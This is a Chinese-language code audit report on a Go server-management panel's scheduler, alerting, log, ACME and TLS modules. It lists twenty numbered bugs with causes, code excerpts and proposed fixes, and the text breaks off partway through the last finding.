# 审计报告：调度 / 告警 / 日志 / ACME

> **审计范围**（本次实际逐行读过的文件）
>
> 目标模块：
> - `internal/cron/handlers.go`、`internal/cron/scheduler.go`
> - `internal/alert/engine.go`、`internal/alert/checker.go`、`internal/alert/sendmail_linux.go`、`internal/alert/sendmail_other.go`、`internal/alert/hooks_test.go`
> - `internal/logmgr/logmgr.go`、`internal/logmgr/logmgr_test.go`、`internal/logmgr/integrity.go`、`internal/logmgr/integrity_test.go`
> - `internal/acme/acme.go`、`internal/acme/webroot.go`、`internal/acme/dns.go`、`internal/acme/providers.go`、`internal/acme/dns_test.go`
> - `internal/tlsgen/panel.go`、`internal/tlsgen/dummy.go`、`internal/tlsgen/panel_test.go`、`internal/tlsgen/dummy_test.go`
>
> 为定位调用链/确认行为而连带读取（仅作佐证）：
> `main.go`、`internal/api/cron.go`、`internal/api/certs.go`、`internal/api/server.go`、`internal/api/auth.go`、`internal/api/principal.go`、`internal/api/tokens.go`、`internal/api/misc.go`、`internal/store/cron_store.go`、`internal/store/backup_store.go`、`internal/store/store.go`、`internal/backup/backup.go`、`internal/service/service.go`、`internal/nginx/render.go`、`go.mod`，以及依赖源码 `github.com/robfig/cron/v3@v3.0.1`（`parser.go` / `spec.go`）。
>
> **审计时间**：2026-10-29
> **说明**：以下每条都基于实际读到的代码，**不臆测**。行号以本次读到的版本为准。未运行 `go build` / `go test` / `go vet`（避与其他并行任务抢构建锁），所有结论均为静态代码推理，推理链条在"证据"里给全。
> **未能判定的部分**：见文末「五、未能判定」。

---

## 〇、先纠正两条任务前提

审计任务书里给的两条前提，**与代码现状不符**，先纠正，避免后面误判：

| 任务书前提 | 代码现状 | 证据 |
|---|---|---|
| "`site_down` 与防篡改告警是已知空钩子（数据落库但不触发通知）" | **两个钩子都已接线，不再是空钩子**。`main.go:214` 注入 `SetSiteProbeProvider`（真实 HTTP 探测），`main.go:241` 注入 `SetTamperChecker`（真实比对 `svc.CheckTamper`）。`alert/hooks_test.go` 还专门锁死了这两条链路。 | `main.go:214-251`、`internal/alert/checker.go:205-241`、`internal/alert/checker.go:263-267` |
| "通知渠道（email/webhook/dingtalk/wecom）是否真的发送？" | **真的发送**，四种渠道都有实现。但**发送失败被完全吞掉**（见 BUG-14）；而**全局类告警（cron 失败、备份失败）只落库、不外发**（见「三、功能残缺」第 1 条，代码注释与 CHANGELOG 都写明是 v0.2.0 的有意取舍）。 | `internal/alert/engine.go:99-109`、`internal/alert/engine.go:124-256` |

即：`site_down` / `tamper` 链路本身**未发现缺陷**（阴性结论见文末）；真正的问题在**告警投递失败无反馈**、**全局告警不外发**、**误报/漏报**三处。

---

## 一、BUG 与缺陷

### BUG-01 备份任务的 `retain` 只删库记录，磁盘上的 tar.gz 永远不删（磁盘泄漏）
- **严重级**：P1
- **位置**：`internal/cron/handlers.go:161-169`、`internal/cron/handlers.go:195-202`；配合 `internal/backup/backup.go:274-287`、`internal/store/backup_store.go:92-101`
- **现象**：配了 `retain=3` 的每日站点备份任务，界面上备份列表稳定在 3 条，但备份目录里的 `.tar.gz` 文件一天比一天多，磁盘持续上涨直到写满；运维完全看不出异常（因为 DB 里查不到多余记录）。
- **触发条件**：任意 `backup_site` / `backup_db` 类型任务且 `payload.retain > 0`，每执行一次泄漏一个备份文件。
- **根因**：**顺序错了**。`handlers.go:162` 先调用 `TrimBackups`（`backup_store.go:92-101` 是 `DELETE ... WHERE id NOT IN (最近 keepN 条)`）把超额的 **DB 记录**删掉；然后 `handlers.go:164` 才调 `FindStaleBackups`（`backup.go:278` 用 `svc.DB().ListBackups(...)` 从 **DB** 列记录）。此时 DB 里已经只剩 keepN 条，`backup.go:283` 的 `if len(all) <= keepN { return nil, nil }` 直接返回空 → `handlers.go:165-168` 的 `os.Remove(bk.Path)` 循环体一次都不执行 → 磁盘文件永远留着。
  附带问题：`backup.go:278` 传 `limit=0`，而 `backup_store.go:41-43` 把 `limit<=0` 解释为 **默认 100**，所以即使把顺序调对，一次最多也只能清理 100 个。
- **影响面**：数据不丢，但**磁盘耗尽**。站点备份通常几十上百 MB，日泄漏一个就是几天内把盘写满 → nginx 写日志失败、SQLite 写入失败 → 面板整体不可用。
- **修复方案**：`handlers.go:161-169` 改成 **先 `FindStaleBackups` 拿到路径 → `os.Remove` → 再 `TrimBackups`**；同时把 `backup.go:278` 的 `ListBackups(kind, target, 0)` 改成显式的足够大的 limit（如 0 → 改语义为"不限"，或传 `keepN+1000`）。更稳的做法是让 `FindStaleBackups` 直接扫备份目录而不是查 DB。
- **证据**：
```go
// handlers.go:161-169
if p.Retain > 0 {
    _ = svc.DB().TrimBackups(string(model.BackupSite), site.ID, p.Retain)   // ← 先删了 DB 记录
    if stale, err := backup.FindStaleBackups(svc, model.BackupSite, site.ID, p.Retain); err == nil {
        for _, bk := range stale {   // ← stale 永远为空
            _ = os.Remove(bk.Path)
        }
    }
}
```

---

### BUG-02 `log_split` 切完日志后 nginx 仍写"归档"文件，实时日志/流量统计/5xx 告警集体失真
- **严重级**：P1
- **位置**：`internal/cron/handlers.go:242-251`（切分逻辑）、`internal/cron/handlers.go:254-281`（保留期逻辑）；配合 `internal/nginx/render.go:273`（nginx 写日志的指令）
- **现象**：跑过一次"切割访问日志"任务后：
  - 站点目录里的 `access.log` 变成 0 字节，流量统计面板"今日请求/今日流量"持续显示 0；
  - 5xx 错误率告警再也不触发；
  - 真实流量全部写进了那个 `access.log.<时间戳>` 归档文件里，而且这个文件**永远不会被保留期清掉**（它的 mtime 一直最新），磁盘持续涨。
- **触发条件**：执行 `log_split` 类型任务后，直到 nginx 下一次 reload（配置下发）为止。
- **根因**：nginx 的 `access_log` 写的是**普通路径**（`render.go:273`：`access_log %s/logs/access.log zhiweipanel_access;`），nginx worker 持有的是**文件描述符**。`handlers.go:244` 用 `os.Rename` 把 `access.log` 改名后，nginx 仍然往**被改名的那个 inode** 写；`handlers.go:248` 新建的空 `access.log` 没有任何进程会写它（注释 `handlers.go:247` "重启后 touch 一个新空文件避免 nginx 写入报错" 的假设不成立——nginx 不会因为文件消失而报错，它的 fd 还在）。保留期 `handlers.go:256` glob 的是 `access.log.*`，命中的正是 nginx 正在写的那个文件；`handlers.go:269-275` 按 mtime 倒序保留最新 → **正在被写的文件永远排第一、永远不删**。
- **影响面**：面板数据失真（流量统计、5xx 告警、日志查看器全部读到空文件），磁盘无限增长。
- **修复方案**：二选一——
  1. **copytruncate**：把 `access.log` 内容 `copy` 到 `access.log.<ts>`，再 `truncate` 原文件到 0（nginx 的 fd 指向同一个 inode，继续写，数据不丢）；
  2. 切分后向 nginx master 发 `USR1` 让它重新打开日志文件（需要 `driver` 增加一个 `ReopenLogs` 能力），再新建 `access.log`。
  另外保留期必须**排除** nginx 正在写的那个文件，否则永远删不掉。
- **证据**：
```go
// handlers.go:242-251
ts := time.Now().Format("2006_01_02_150405")
archive := filepath.Join(logsDir, "access.log."+ts)
if err := os.Rename(f, archive); err != nil {   // ← nginx 的 fd 还指着这个 inode
    return fmt.Errorf("切分 %s 失败: %w", f, err)
}
f2, _ := os.OpenFile(f, os.O_CREATE|os.O_WRONLY, 0644)  // ← 新文件没人写
```

---

### BUG-03 手动"续签证书"后站点仍在用旧证书（自动续签有重绑，手动续签没有）
- **严重级**：P1
- **位置**：`internal/api/certs.go:179-192`（`case "renew"`）
- **现象**：在证书页面点"续签"，接口返回 200 且返回一张新证书，界面上能看到新证书的到期时间；但 nginx 继续 serve **旧证书**。等到旧证书自然过期，站点 HTTPS 直接挂掉，且用户完全不知道原因（续签"成功"了）。
- **触发条件**：任何一次通过 `POST /api/certs/{id}/renew` 发起的手动续签。
- **根因**：`acme.Renew` 产出的是**全新 ID、全新文件路径**的证书（`acme.go:267` `id := store.NewID()`、`acme.go:268-274` 新目录新文件）。自动续签路径有 `main.go:501` 的 `rebindRenewedCert` 把站点重新绑定到新证书；但 API 手工续签路径（`certs.go:187-192`）**只把 `renewed` 原样写回响应**，既没有 `bindCertToSite`（`certs.go:131`），也没有更新 `site.SSL.CertFile/KeyFile`。
- **影响面**：HTTPS 下线（证书过期）；同时站点 `site.Cert.CertID` 仍指向旧证书 → `checker.go:175` 的证书临期告警用的也是旧日期。
- **修复方案**：`certs.go:187-192` 拿到 `renewed` 后，复用 `main.go:407-429` 的重绑逻辑（建议把 `rebindRenewedCert` 抽到 `internal/service` 或 `internal/api` 公共位置），按域名反查站点并更新 `site.Cert` + `site.SSL.CertFile/KeyFile`，然后 `ApplyAllConfig`。
- **证据**：
```go
// api/certs.go:179-192
case "renew":
    cert, err := s.svc.DB().GetCert(id)
    ...
    roots := s.webrootsFor(cert.Domains)
    renewed, err := s.svc.ACME().Renew(r.Context(), id, roots)
    if err != nil { writeModelError(w, err); return }
    writeJSON(w, http.StatusOK, renewed)   // ← renewed 被丢弃，没有重绑
```

---

### BUG-04 自动续签每次都新增一条证书记录，旧记录永远"到期待续签"→ 重复签发 → 撞 Let's Encrypt 重复签发限额
- **严重级**：P1
- **位置**：`internal/acme/acme.go:266-268`、`internal/acme/acme.go:503-518`、`internal/store/store.go:406-418`；调用侧 `main.go:465-507`
- **现象**：跑一段时间后，证书列表里同一个域名出现多条证书记录，证书目录里多出一堆孤儿目录；自动续签日志里开始刷 `证书续签失败: ... too many certificates already issued for this exact set of domains`，之后证书再也不会被续签成功 → 站点 HTTPS 在证书到期时下线，且**一周内无法恢复**。
- **触发条件**：任何 `AutoRenew=true` 且 `Source=letsencrypt` 的证书，跑满 ~2.5 天（续签周期 12 小时，`main.go:460`）。
- **根因**：
  1. `acme.go:267` 每次 `saveCertificate` 都 `store.NewID()` 生成**新 ID**；
  2. `store.go:406-418` 的 `SaveCert` 是 `INSERT ... ON CONFLICT(id) DO UPDATE`，新 ID ⇒ **INSERT 新行**，旧行原封不动留在 `certs` 表里；
  3. 旧行的 `auto_renew` 仍是 1、`not_after` 仍是旧值（早已过期）⇒ `acme.go:513` 的 `c.DaysLeft() <= renewBeforeDays` 永远成立 ⇒ `AutoRenewDue` 每 12 小时又把这条旧记录选出来续签一次 ⇒ 又生成一条新记录 + 一个新 ACME 订单。
  4. Let's Encrypt 对**完全相同域名集合**的重复签发限制是每周 5 张 ⇒ 大约 2.5 天后开始失败。
  5. `main.go:501` 的 `rebindRenewedCert` 只更新站点绑定，**不删除旧证书行、也不删旧证书目录**（`certDir/<oldID>/` 里的私钥永久残留）。
- **影响面**：自动续签最终不可恢复（站点 HTTPS 下线）、`certs` 表与证书目录无限增长、私钥文件泄漏。
- **修复方案**：
  - `Renew` 成功后**复用原 cert ID**：给 `saveCertificate` 增加 `keepID` 参数（续签时传入 `existing.ID`），把新证书文件写进原目录并覆盖，`SaveCert` 走 UPDATE 分支；或者续签成功后显式 `DeleteCert(oldID)` + 删除旧目录；
  - `AutoRenewDue` 过滤掉 `DaysLeft() < 0`（已彻底过期且已被新证书取代）的记录；
  - 加一个"孤儿证书目录"清理任务。
- **证据**：
```go
// acme.go:266-268
func (m *Manager) saveCertificate(resource *certificate.Resource, req IssueRequest) (*model.Cert, error) {
	id := store.NewID()          // ← 每次都是新 ID
	dir := filepath.Join(m.certDir, id)
```
```go
// acme.go:509-515
for _, c := range certs {
    if !c.AutoRenew || c.Source != "letsencrypt" { continue }
    if c.DaysLeft() <= renewBeforeDays { due = append(due, c) }  // ← 旧记录永远满足
}
```

---

### BUG-05 ACME 账户私钥文件损坏时会静默换新密钥，把账户绑定弄断
- **严重级**：P2
- **位置**：`internal/acme/acme.go:437-474`
- **现象**：某次续签报 `ACME 账户注册失败: ... account does not exist`（或类似的 key 关联错误），此后**所有**该账户的签发/续签全部失败，且面板没有任何提示说"密钥被换掉了"。
- **触发条件**：账户私钥文件存在但内容被截断/损坏（磁盘故障、手工编辑、被别的进程覆盖）。
- **根因**：`acme.go:442-446` 读文件失败**或** `certcrypto.ParsePEMPrivateKey` 解析失败时，代码**不报错**，直接往下走到 `acme.go:448-455` 生成一把**全新**的密钥，并在 `acme.go:466` 覆盖写回原路径（`account.KeyPath` 不变，但内容变了）。ACME 账户与私钥是强绑定的：换钥之后 `client.Registration.Register`（`acme.go:111`）会失败，而 `acme.go:112` 的容错只放行包含 "already" 的错误 ⇒ 直接失败返回。
- **影响面**：该 ACME 账户下所有证书的自动续签永久失败（除非重新建账户）。
- **修复方案**：`acme.go:442-446` 区分"文件不存在"（可生成）与"文件存在但解析失败"（**必须报错**，绝不覆盖），例如：
```go
data, err := os.ReadFile(path)
if err == nil {
    key, perr := certcrypto.ParsePEMPrivateKey(data)
    if perr != nil {
        return nil, fmt.Errorf("账户私钥 %s 损坏，拒绝覆盖（请备份后手动删除重建账户）: %w", path, perr)
    }
    return key, nil
}
if !os.IsNotExist(err) { return nil, err }
```

---

### BUG-06 调度器回写整行数据，会把用户对任务的并发修改覆盖掉
- **严重级**：P2
- **位置**：`internal/cron/scheduler.go:181-193`；落库 `internal/store/cron_store.go:37-48`
- **现象**：用户正在改一个正在运行的任务（比如把 `schedule` 从 `0 2 * * *` 改成 `0 3 * * *`，或改 payload），保存后过一会儿，任务又变回旧值；用户改的 `enabled=false` 也可能被"复活"。
- **触发条件**：任务运行期间（`scheduler.go:117` `go s.runOne(ctx, j)` 与用户 PUT `/api/cron/jobs/{id}` 并发）。
- **根因**：`tick`（`scheduler.go:108`）一次性把整行读出来，交给 goroutine；`markFinished`（`scheduler.go:181-193`）拿到的是**任务开始时的内存快照** `j`，改了几个字段后调用 `s.db.SaveCronJob(j)`。而 `cron_store.go:37-48` 是**整行 upsert**（`ON CONFLICT(id) DO UPDATE SET name=..., type=..., enabled=..., schedule=..., target=..., payload=..., next_run_at=...`），把内存快照里的**全部旧值**写回。
- **影响面**：用户修改丢失（配置回滚）；把一个正在跑的任务改禁用，可能在跑完后被重新启用。
- **修复方案**：新增一个只更新运行态字段的存储方法，例如
```sql
UPDATE cron_jobs SET last_run_at=?, last_status=?, last_msg=?, next_run_at=? WHERE id=?
```
`markFinished` 只调它，不再整行 `SaveCronJob`。
- **证据**：
```go
// scheduler.go:181-193
func (s *Scheduler) markFinished(j *model.CronJob, run *model.CronRun) {
	j.LastRunAt = &run.StartedAt
	j.LastStatus = model.CronJobStatus(run.Status)
	j.LastMsg = run.Message
	...
	if err := s.db.SaveCronJob(j); err != nil {   // ← 整行写回，把用户的修改覆盖了
```

---

### BUG-07 "立即执行"在任务运行中被静默丢弃，接口却返回 ok
- **严重级**：P2
- **位置**：`internal/api/cron.go:163-188`；调度侧 `internal/cron/scheduler.go:121-132`
- **现象**：任务正在运行时点"立即执行"，接口返回 `{"ok":true,"next_run_at":...}`，但任务**并没有**被额外执行一次；用户以为跑了，其实没有。
- **触发条件**：目标任务此刻正在 `running` 集合里。
- **根因**：`cron.go:181-186` 的"立即执行"实现是**把 `next_run_at` 改成 now**，让调度器自己捡起来。调度器 `scheduler.go:114-116` 调 `tryStart`，`scheduler.go:124-126` 发现该 job 已在 `running` 里 → **直接 skip**（既不执行也不排队）。而正在跑的那个实例结束时，`markFinished`（`scheduler.go:187-188`）会把 `next_run_at` 重算成下个计划时间 ⇒ 手动触发被彻底抹掉。
- **影响面**：功能形同虚设（"立即执行"按钮在任务运行期间无效且无提示）。
- **修复方案**：要么在 API 侧检测"任务在运行"并返回 409 + 明确文案；要么在 `cron_runs` 加一个 `manual_trigger` 标志位，由调度器在当前实例结束后补跑一次。
- **证据**：
```go
// scheduler.go:121-132
func (s *Scheduler) tryStart(id string) bool {
	s.mu.Lock(); defer s.mu.Unlock()
	if _, busy := s.running[id]; busy { return false }   // ← 忙就丢弃，无排队
```

---

### BUG-08 任务类型非法时 `cron_runs` 不做清理，执行历史表无限增长
- **严重级**：P2
- **位置**：`internal/cron/scheduler.go:146-155`（错误分支）vs `internal/cron/scheduler.go:171-172`（正常分支）
- **现象**：某个任务每分钟往 `cron_runs` 插一行、永远不删，`cron_runs` 表持续膨胀。
- **触发条件**：任务的 `type` 字段是一个 `handlerFor` 不认识的值（`scheduler.go:31-47` 的 switch 之外）。**API 层不校验 type**：`api/cron.go:58` 直接 `model.CronJobType(body.Type)`，`api/cron.go:119-121` 的 PUT 同样不校验 ⇒ 用户（或任何能写 API 的调用方）随便填个 `"xxx"` 就能触发。
- **根因**：`scheduler.go:146-155` 的 handler 查找失败分支里 `InsertCronRun` 之后**没有** `TrimCronRuns`；而正常路径 `scheduler.go:172` 有 `_ = s.db.TrimCronRuns(j.ID, 50)`。
- **影响面**：数据库膨胀（`"* * * * *"` 的坏类型任务 = 1440 行/天/任务，无上限）。
- **修复方案**：(a) `api/cron.go` 创建与更新时校验 `type ∈ {shell, backup_site, backup_db, log_split, release_mem, access_url}`，非法直接 400；(b) `scheduler.go:146-155` 错误分支补 `TrimCronRuns`；(c) 更好的做法是任务类型非法时**直接把任务禁用**并告警。

---

### BUG-09 5xx 告警的"窗口分钟数"为 0 时规则永不触发（静默失效）
- **严重级**：P2
- **位置**：`internal/alert/checker.go:96-108`
- **现象**：给站点配了 `status_5xx` 规则，阈值也填了，但 5xx 涨到几千次面板也不报警。
- **触发条件**：规则的 `WindowMinutes` 为 0（前端没填/存库为 0）。
- **根因**：`checker.go:96` `window := time.Now().Add(-time.Duration(rule.WindowMinutes) * time.Minute)`，`WindowMinutes=0` 时 `window == now`；`checker.go:99` 的 `r.Time.After(window)` 对所有历史记录都是 false ⇒ `total==0` ⇒ `checker.go:106-108` `continue` ⇒ 永远不告警。代码对 `rule.Value`（阈值）做了默认值兜底（`checker.go:109-112`），但对 `WindowMinutes` **没有**兜底。
- **影响面**：5xx 告警对该站点完全失效（且没有任何提示）。
- **修复方案**：`checker.go:96` 之前加兜底 `if rule.WindowMinutes <= 0 { rule.WindowMinutes = 10 }`（或在 API 层强制校验窗口 ≥1）。

---

### BUG-10 站点未建立防篡改基线时，每 30 分钟报一次"检测到网站文件被篡改"
- **严重级**：P2
- **位置**：`main.go:241-251`；判定链 `internal/service/service.go:813-816`、`internal/logmgr/integrity.go:115-135`
- **现象**：站点开了"防篡改 + 篡改时告警"，但没点过"建立基线"（或基线表被清），面板告警页每半小时刷一条 **critical** 级"检测到网站文件被篡改，请立即检查"，实际文件一个都没被改。
- **触发条件**：`site.Lock.Enabled && site.Lock.AlertOnTamper` 且 `integrity` 表里该站点没有基线记录。
- **根因**：`service.go:804-811` 取基线，空 map；`service.go:813` 调 `logmgr.Diff(siteRoot, files, baseline)`；`integrity.go:119-123` 对"当前有、基线没有"的文件一律记为 `Added`；`integrity.go:104-106` `IsClean()` 因 `Added` 非空而返回 false ⇒ `main.go:250` `return !diff.IsClean()` ⇒ true ⇒ 触发 critical 告警。`Diff` 的注释（`integrity.go:114`）明确写了"baseline 允许为 nil（首次建立基线，此时所有文件都算'新增'）"，但调用方没有区分"没有基线"和"有基线且被改"。
- **影响面**：**告警误报**（critical 级，最容易造成告警疲劳，用户会开始忽略所有告警）；同时 `service.go:818-829` 会为每个文件写一条 `tamper_events` 记录（见 BUG-11）。
- **修复方案**：在 `main.go:241-251` 的注入实现里先判断基线是否为空：为 → 返回 false（并可选自动建立一次基线）；或改 `service.go:813`，基线为空时先 `EstablishBaseline` 再返回 clean。

---

### BUG-11 防篡改事件表无限增长（每 5 分钟重复写同一批文件）
- **严重级**：P2
- **位置**：`internal/service/service.go:818-830`；落库 `internal/store/store.go:984-991`
- **现象**：`tamper_events` 表持续变大；站点列表上的"篡改事件"计数只增不减。
- **触发条件**：站点存在任何未解决的篡改差异（哪怕是 BUG-10 那种误报）。
- **根因**：`checker.go:28-39` 的检查循环**每 5 分钟**跑一次（`main.go:275` `go checker.Run(ctx, 5*time.Minute)`）；每次发现差异，`service.go:820-829` 都为**每一个** modified/added 文件 `SaveTamperEvent` 一行。`store.go:984-991` 的 `SaveTamperEvent` 是纯 INSERT，**全库没有任何清理/去重逻辑**（`ListTamperEvents` 只读，`CountTamperEvents` 只统计 `resolved=0`）。
- **影响面**：数据库膨胀；每个未解决的文件每小时 12 行。
- **修复方案**：(a) 只在"状态发生变化"时写事件（对比上一次的事件集）；(b) 加一个保留期清理任务（与 `runSessionCleaner` 合并）。

---

### BUG-12 crontab 表达式拒绝 `7`（星期日），与标准 crontab 不兼容
- **严重级**：P2
- **位置**：`internal/cron/scheduler.go:61-63`（解析器配置）、`internal/cron/scheduler.go:241-248`（`ParseSchedule`）；依赖 `robfig/cron/v3@v3.0.1` 的 `spec.go:40`
- **现象**：用户填 `0 2 * * 7`（Vixie cron / 宝塔里表示"每周日 2 点"）→ 面板报 `crontab 表达式不合法: day-of-week out of range`，任务根本建不出来。
- **触发条件**：用户使用星期日的数字 `7`（国内运维习惯里非常常见）。
- **根因**：`robfig/cron v3` 的 `spec.go:40` 定义 `dow = bounds{0, 6, ...}`，**只接受 0-6**，不接受 Vixie cron 的 `7`。面板直接透传用户表达式，没有做归一化。
- **影响面**：从 crontab / 宝塔迁移过来的用户会遇到莫名其妙的报错（面板文档宣传"标准 5 段 crontab 表达式"）。
- **修复方案**：在 `cron.ParseSchedule` 里先做归一化——把第 5 段中的独立 `7` 替换成 `0`（`0-6` 保持不变，`*/7` 不动）：
```go
func normalizeDow(expr string) string { /* 只改第 5 段的独立 7 */ }
```
另外注意 v3 还支持 `TZ=`/`CRON_TZ=` 前缀（`parser.go:95-103`），面板没有在 UI 上暴露，也没在错误提示里说明。

---

### BUG-13 TLS 自签证书的"可用性"检查不校验证书与私钥是否配对
- **严重级**：P2
- **位置**：`internal/tlsgen/dummy.go:71-101`（`usable`）；`internal/tlsgen/panel.go:26-27`（**注释声称做了配对检查**）
- **现象**：catch-all dummy 证书（或面板 HTTPS 证书）文件存在、nginx 报 `SSL_CTX_use_PrivateKey: key values mismatch`，443 起不来；重启面板也不会自愈，因为面板认为"证书可用"。
- **触发条件**：`EnsureDefault`（`dummy.go:60-64`）**先写私钥再写证书**两次调用之间失败（磁盘满、权限问题、进程被杀），或者有人手工换过其中一个文件。
- **根因**：`usable()` 分别 `pem.Decode` + `x509.ParseCertificate`（`dummy.go:81-88`）和 `x509.ParsePKCS1PrivateKey`（`dummy.go:93-99`），**从头到尾没有比较两者的公钥**。`panel.go:26-27` 的注释"usable() 检查证书可解析且私钥匹配"与实现不符（`panel.go:28-52` 的 `EnsureForPanel` 复用了同一个 `usable`）。
- **影响面**：443 不可用且**无法自愈**（catch-all 失效还会连带影响"跨站隔离"这一安全设计，`dummy.go:1-9` 注释所述）。
- **修复方案**：
  1. 在 `usable()` 里比较公钥：`x509.MarshalPKIXPublicKey(cert.PublicKey)` 与 `x509.MarshalPKIXPublicKey(&key.PublicKey)` 比对（或用 `cert.CheckSignature` 之外的 `key.PublicKey.Equal(cert.PublicKey)`）；
  2. 写文件顺序改为"先写证书、再写私钥"，并把两个文件都写成 `.tmp` 后**依次 rename**（rename 是原子的，但两个 rename 之间仍有窗口——所以第 1 步的配对校验是必须的兜底）。
  3. 补一个回归测试：故意写入不匹配的 cert/key，断言 `EnsureDefault` 会重新生成（现有 `dummy_test.go` 只覆盖了"两个都是垃圾"的场景，`dummy_test.go:93-110`）。

---

### BUG-14 通知渠道发送失败被完全吞掉，没有任何反馈
- **严重级**：P2
- **位置**：`internal/alert/engine.go:83-91`
- **现象**：钉钉/企微/webhook 配错了（token 过期、URL 打错、内网不通），面板照样落一条告警、页面上一切正常，但**通知从来没发出去**。用户以为自己有告警覆盖，实际是裸奔。
- **触发条件**：任意一次渠道投递失败（网络不通、HTTP ≥ 300、sendmail 不存在）。
- **根因**：`engine.go:87-90`：
```go
if err := e.notify(context.Background(), ch, a); err != nil {
    // 通知失败不阻断告警落库
    continue          // ← err 被丢弃：既不记日志，也不落库，也不重试
}
```
注意 `engine.go:87` 用的是 `context.Background()`，**没有超时**——`e.client` 自身有 10s 超时（`engine.go:37`）所以 HTTP 渠道不会永久挂住，但 `notifyEmail`（`engine.go:235-238`）走的是 `exec.CommandContext(ctx, ...)` 且 ctx 无 deadline ⇒ **sendmail 卡住会永久阻塞告警循环**（见 BUG-22）。
- **影响面**：告警投递静默失效（监控系统里最危险的失败模式）；用户无法察觉。
- **修复方案**：
  1. 至少 `log.Printf("[alert] 渠道 %s 投递失败: %v", ch.Type, err)`；
  2. 给 `model.Alert` 加 `notify_status` / `notify_error` 字段，把投递结果落到告警行，页面上可见；
  3. 给 `Raise` 传入带超时的 ctx（`context.WithTimeout(ctx, 15*time.Second)`）。

---

### BUG-15 导入的证书可以不带域名，后续"续签"会 panic
- **严重级**：P3
- **位置**：`internal/api/certs.go:272-293`（导入不校验 domains）、`internal/acme/acme.go:235`、`internal/acme/acme.go:298`
- **现象**：导入一张不带域名的证书后，再点"续签" → 后端 500 + 一段 `index out of range` 堆栈。
- **触发条件**：`POST /api/certs/import` 的 body 里 `domains` 为空数组/缺省。
- **根因**：`certs.go:272-293` 只校验了 `CertPEM`/`KeyPEM` 非空（`certs.go:282-285`），**没校验 `Domains`**；`Import`（`acme.go:328-381`）原样存下空域名。续签时 `acme.go:235` `existing.Domains[0]`、`acme.go:298` `req.Domains[0]` 直接下标访问 ⇒ panic。
- **影响面**：当前只在 HTTP 处理路径里（`net/http` 会 recover，返回 500 不崩进程）。但 `main.go:489` 的自动续签是裸 goroutine —— 一旦将来出现一条无域名且 `auto_renew=1` 的证书记录，**panic 会带崩整个面板进程**。
- **修复方案**：`certs.go:286` 前加 `if len(body.Domains) == 0 { 400 }`；`acme.go:234` 前加 `if len(existing.Domains) == 0 { return nil, fmt.Errorf("证书 %s 没有域名，无法续签", existing.Name) }`；`acme.go:298` 同样加保护。

---

### BUG-16 `truncateMsg` 按字节截断，会把 UTF-8 中文切坏
- **严重级**：P3
- **位置**：`internal/cron/scheduler.go:232-237`
- **现象**：执行历史里的中文报错信息末尾出现 `` 乱码，前端显示成替换字符。
- **触发条件**：错误信息长度超过 500（shell 输出）或 1000（`scheduler.go:164`）字节，且正好切在多字节字符中间。
- **根因**：`scheduler.go:235` `return s[:n] + "...(truncated)"` 是**字节**切片，`s` 是 UTF-8 字符串。
- **影响面**：显示层小瑕疵；但错误信息主体是中文，实际触发概率不低。
- **修复方案**：改用 `[]rune` 切片，或按 `utf8.RuneStart` 回退到字符边界。

---

### BUG-17 `log_split` 的归档文件名只有秒级精度，同秒重跑会覆盖归档
- **严重级**：P3
- **位置**：`internal/cron/handlers.go:242-244`
- **现象**：同一秒内切分两次，第二次 `os.Rename` 覆盖第一次的归档文件 → 那段时间的访问日志丢失。
- **触发条件**：手动连点两次"立即执行"（`api/cron.go:163`）或两次任务恰好撞在同一秒。
- **根因**：`handlers.go:242` `ts := time.Now().Format("2006_01_02_150405")` 在循环外只算一次，且精度到秒；`handlers.go:244` 的 `os.Rename` 会覆盖同名目标。
- **影响面**：小概率日志丢失。
- **修复方案**：文件名加纳秒/随机后缀；或 `Rename` 前先判断目标存在则追加序号。

---

### BUG-18 `@every` 描述符的实际执行频率与用户填写的不一致
- **严重级**：P3
- **位置**：`internal/cron/scheduler.go:33`（`TickInterval = 30s`）、`internal/cron/scheduler.go:187`；依赖 `robfig/cron/v3@v3.0.1` 的 `parser.go:424-431`
- **现象**：任务填 `@every 5s`，实际每 30 秒才跑一次（面板的扫描周期决定的），界面里却显示 5 秒。
- **触发条件**：任何 `@every <小于 30s>` 的表达式。
- **根因**：v3 的 `parseDescriptor`（`parser.go:424-431`）支持 `@every <duration>` 并返回 `Every(duration)`（`constantdelay.go`），其 `Next` 是"当前时刻 + delay"；`markFinished`（`scheduler.go:187`）算出的 `next_run_at` 永远落在扫描周期之内，而扫描器 30 秒才醒一次（`scheduler.go:33`、`scheduler.go:92`）。
- **影响面**：语义不符（用户以为的高频任务实际被限流），也解释了为什么"分钟级 cron 也能接受"是设计取舍。
- **修复方案**：在 `ParseSchedule` 里拒绝 `@every` 小于 `TickInterval` 的值，并给出明确报错；或在 UI 上提示"最小粒度 30 秒"。

---

### BUG-19 告警冷却窗口只存在内存里，面板重启后立即失效
- **严重级**：P3
- **位置**：`internal/alert/engine.go:27-30`、`internal/alert/engine.go:44-53`
- **现象**：宿主机重启/面板重启后，所有站点的第一轮检查会**同时**触发一轮告警（因为冷却状态全丢），短时间内 N 条通知。
- **触发条件**：面板重启后紧接着的一次 `CheckOnce`。
- **根因**：`engine.go:39` `lastSent: map[string]time.Time{}` 是纯内存结构，无持久化。
- **影响面**：告警风暴（站点多时明显）。注意 `Engine.Reset()`（`engine.go:56-60`）的注释写明"用于测试"，说明设计者知道它是内存态，但没有考虑重启场景。
- **修复方案**：把 `last_sent` 落到 DB（`alerts` 表加 `last_notified_at`，或用 `settings` 表存一个 JSON），或启动时从最近的 `alerts` 记录回填冷却状态。

---

### BUG-20 单条超过 1MB 的日志行会让 `ReadAccessLog` 返回"窗口内最旧"的记录而不是最新的
- **严重级**：P2
- **位置**：`internal/logmgr/logmgr.go:126-142`（读取循环）、`internal/logmgr/logmgr.go:100-124`（seek 到窗口起点）
- **现象**：站点日志里出现一条超长行（超长 URL / 超长 UA，**攻击者可以构造**）之后：
  - 日志查看器显示的是窗口内**最旧**的记录，而不是最新的；
  - 5xx 告警（`checker.go:92`）拿到的全是旧记录，窗口过滤后 `total==0` ⇒ **告警彻底静默**；
  - 流量统计（`service.go:771`）同样只统计到旧数据。
- **触发条件**：访问日志中出现任何一行 > `maxLogLineBytes`（`logmgr.go:20` = 1MB）的记录。
- **根因**：`logmgr.go:127-135` 用 `bufio.Scanner` 读取，`logmgr.go:128` 把 buffer 上限设成 1MB。**当某行超长时 `sc.Scan()` 返回 false 并终止整个扫描循环**（不是"跳过这一行"）⇒ 后面（更新的）记录一条都读不到。`logmgr.go:138-142` 虽然吞掉了 `bufio.ErrTooLong`，但**扫描已经提前结束**了。
